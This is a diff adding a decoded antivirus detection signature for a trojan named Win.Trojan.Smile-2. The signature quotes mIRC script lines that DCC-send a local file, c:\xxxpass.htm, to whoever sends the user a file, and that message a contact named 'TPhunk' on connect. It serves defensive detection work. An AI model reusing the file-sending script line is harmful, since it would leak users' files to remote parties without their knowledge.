@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Smile-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ript]
+n0=on 1:FILERCVD:*.*:./dcc send $nick c:\xxxpass.htm
+n1=on 1:Connect:./msg TPhunk Hi there
+
